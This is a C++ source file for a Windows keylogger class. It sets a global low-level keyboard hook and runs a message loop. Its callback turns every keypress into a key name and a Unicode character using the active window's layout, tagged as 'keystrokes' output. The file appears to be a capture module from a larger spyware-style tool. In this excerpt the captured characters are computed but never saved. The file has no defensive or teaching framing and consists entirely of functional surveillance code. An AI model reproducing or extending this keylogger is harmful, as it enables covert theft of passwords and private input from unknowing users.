#pragma once
#include "KeyLogger.h"
#include <stdio.h>
#include <Windows.h>

#define BUF_SIZE 100

KeyLogger::KeyLogger()
{
	mHookReleased = true;
}

KeyLogger::~KeyLogger()
{
	if (!mHookReleased)
	{
		Finalize();
	}
}

void KeyLogger::Init()
{
	InstallHook();
	mHookReleased = false;
}

void KeyLogger::Finalize()
{
	UnhookWindowsHookEx(mHook);
	mHookReleased = true;
}

PSTR KeyLogger::GetName()
{
	return "keystrokes";
};

PSTR KeyLogger::GetExtension()
{
	return "txt";
};

void KeyLogger::InstallHook(void)
{
     // Retrieve the applications instance
    HINSTANCE appInstance = GetModuleHandle(NULL);

    // Set a global Windows Hook to capture keystrokes. Callback to static wrapper for non-static function
    mHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::LowLevelKeyboardProc, appInstance, 0 );
	
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	// This is needed according to MSDN
	if (nCode >= 0)
	{	
		KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

		if (wParam == WM_KEYDOWN)
		{
			DWORD dwMsg = 1;
			dwMsg += pKeyBoard->scanCode << 16;
			dwMsg += pKeyBoard->flags << 24;

			const int KEYNAME_LENGTH = 20;
			wchar_t keyname[KEYNAME_LENGTH]={0};
			keyname[0] = L'[';
			int act_length = GetKeyNameTextW(dwMsg, keyname+1, KEYNAME_LENGTH-1);
			keyname[act_length + 1] = L']';

			// This block retrieves keyboard layout of active window 
			GUITHREADINFO guiThreadInfo;
			guiThreadInfo.cbSize = sizeof(GUITHREADINFO);
			GetGUIThreadInfo(0, &guiThreadInfo);
			DWORD dwThreadID = GetWindowThreadProcessId(guiThreadInfo.hwndActive, NULL);
			HKL layout = GetKeyboardLayout(dwThreadID);

			BYTE keyState[256];
			GetKeyboardState(keyState);
			wchar_t unicode = 0;

			ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keyState, &unicode, 1, pKeyBoard->flags, layout);
		}
	}

	HHOOK hhook = NULL;
	return CallNextHookEx(hhook, nCode, wParam, lParam);
}
